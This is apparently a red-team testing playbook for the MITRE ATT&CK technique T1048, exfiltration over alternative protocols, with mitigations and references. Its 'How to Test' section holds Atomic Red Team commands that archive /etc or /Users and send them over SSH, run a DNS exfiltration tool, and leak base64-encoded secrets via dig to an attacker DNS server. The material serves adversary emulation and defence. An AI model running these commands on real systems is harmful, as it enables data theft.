---
name: "T1048_exfiltration-over-alternative-protocol"
description: "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1048
  - exfiltration
  - esxi
  - iaas
  - linux
  - macos
  - network-devices
  - office-suite
  - saas
  - windows
technique_id: "T1048"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - ESXi
  - IaaS
  - Linux
  - macOS
  - Network Devices
  - Office Suite
  - SaaS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1048"
tech_stack:
  - esxi
  - cloud
  - linux
  - macos
  - network devices
  - office
  - saas
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1048.001
  - T1048.002
  - T1048.003
prerequisites:
  []
severity_boost:
  T1048.001: "Chain with T1048.001 for deeper attack path"
  T1048.002: "Chain with T1048.002 for deeper attack path"
  T1048.003: "Chain with T1048.003 for deeper attack path"
---

# T1048 Exfiltration Over Alternative Protocol

## High-Level Description

Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.

Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** ESXi, IaaS, Linux, macOS, Network Devices, Office Suite, SaaS, Windows

## What to Check

- [ ] Identify if Exfiltration Over Alternative Protocol technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Exfiltration Over Alternative Protocol
- [ ] Check IaaS systems for indicators of Exfiltration Over Alternative Protocol
- [ ] Check Linux systems for indicators of Exfiltration Over Alternative Protocol
- [ ] Verify mitigations are bypassed or absent (6 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Exfiltration Over Alternative Protocol - SSH

Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.

**Supported Platforms:** macos, linux

```bash
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
```

### Atomic Test 2: Exfiltration Over Alternative Protocol - SSH

Input a domain and test Exfiltration over SSH

Local to Remote

Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.

**Supported Platforms:** macos, linux

```bash
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
```

### Atomic Test 3: DNSExfiltration (doh)

DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.
!!! Test will fail without a domain under your control with A record and NS record !!! 
See this github page for more details - https://github.com/Arno0x/DNSExfiltrator

**Supported Platforms:** windows

```powershell
Import-Module "#{ps_module}"
Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
```

**Dependencies:**
- DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})

### Atomic Test 4: Exfiltrate Data using DNS Queries via dig

This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and 
making DNS queries via the dig command to a controlled DNS server.

**Supported Platforms:** macos, linux

```bash
dig @#{attacker_dns_server} -p #{dns_port} $(echo "#{secret_info}" | base64).google.com
```

**Dependencies:**
- dig command


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Exfiltration Over Alternative Protocol by examining the target platforms (ESXi, IaaS, Linux).

2. **Assess Existing Defenses**: Review whether mitigations for T1048 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1030 Network Segmentation
Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.

### M1057 Data Loss Prevention
Data loss prevention can detect and block sensitive data being uploaded via web browsers.

### M1037 Filter Network Traffic
Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP allowlisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data.

### M1031 Network Intrusion Prevention
Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.

### M1022 Restrict File and Directory Permissions
Use access control lists on cloud storage systems and objects.

### M1018 User Account Management
Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary.


## Detection

### Behavioral Detection Strategy for Exfiltration Over Alternative Protocol


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Exfiltration Over Alternative Protocol technique applicable | Medium | Exfiltration |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [Palo Alto OilRig Oct 2016](http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/)
- [20 macOS Common Tools and Techniques](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)
- [Atomic Red Team - T1048](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1048)
- [MITRE ATT&CK - T1048](https://attack.mitre.org/techniques/T1048)
